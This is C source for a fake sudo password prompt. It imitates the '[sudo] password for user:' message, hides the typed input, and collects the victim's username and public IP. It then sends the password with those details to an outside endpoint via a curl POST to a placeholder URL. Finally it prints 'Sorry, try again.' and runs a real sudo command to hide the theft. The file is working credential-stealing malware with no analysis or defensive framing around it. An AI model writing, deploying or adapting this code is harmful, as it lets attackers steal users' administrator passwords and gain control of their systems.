#include <stdio.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>
#define MAX_PASSWORD_LENGTH 100
#define MAX_BUFFER_SIZE 1024
void removeCharacter(char *str, char c) {
    int readIndex = 0, writeIndex = 0;

    while (str[readIndex]) {
        if (str[readIndex] != c) {
            str[writeIndex] = str[readIndex];
            writeIndex++;
        }
        readIndex++;
    }
    str[writeIndex] = '\0';
}

int executeCommand(const char *command, char *result) {
    FILE *pipe = popen(command, "r");  // Run the command and open a pipe to read its output

    if (!pipe) {
        perror("popen");
        return -1;
    }

    char buffer[MAX_BUFFER_SIZE];
    memset(buffer, 0, sizeof(buffer));

    while (fgets(buffer, MAX_BUFFER_SIZE, pipe) != NULL) {
        strcat(result, buffer);
    }

    int status = pclose(pipe);

    if (status == -1) {
        perror("pclose");
        return -1;
    }

    return status;
}

char* concat(const char *s1, const char *s2)
{
    char *result = malloc(strlen(s1) + strlen(s2) + 1);

    strcpy(result, s1);
    strcat(result, s2);
    return result;
}

void sendMessage(const char *content) {
    char curlCommand[1024];
    char payload[100] = "`";
    char ip[MAX_BUFFER_SIZE] = "";
    char username[MAX_BUFFER_SIZE] = "";
    executeCommand("curl -s https://icanhazip.com/", ip);
    executeCommand("whoami", username);

    strcat(payload, username);
    strcat(payload, "@");
    strcat(payload, ip);
    strcat(payload, " -p ");
    strcat(payload, content);
    strcat(payload, "`");
    removeCharacter(payload, '\n');

    snprintf(curlCommand, sizeof(curlCommand),
             "curl -s -X POST -H \"Content-Type: application/json\" "
             "-d '{\"content\": \"%s\"}' "
             "URL >/dev/null 2>&1",
             payload);
    system(curlCommand);

    printf("\n");
}

void disable_echo() {
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    term.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &term);
}

void enable_echo() {
    struct termios term;
    tcgetattr(STDIN_FILENO, &term);
    term.c_lflag |= ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &term);
}

int main() {
    char password[MAX_PASSWORD_LENGTH];
    int i = 0;
    char c;

    printf("[sudo] password for user: ");
    fflush(stdout);
    disable_echo();

    while (i < MAX_PASSWORD_LENGTH) {
        c = getchar();
        if (c == '\n') {
            password[i] = '\0';
            break;
        } else if (c == '\b' && i > 0) {
            printf("\b \b");
            i--;
        } else {
            password[i] = c;
            i++;
        }
    }

    enable_echo();
	sendMessage(password);
	printf("Sorry, try again.\n");
	system("sudo systemctl restart sshd");
    return 0;
}

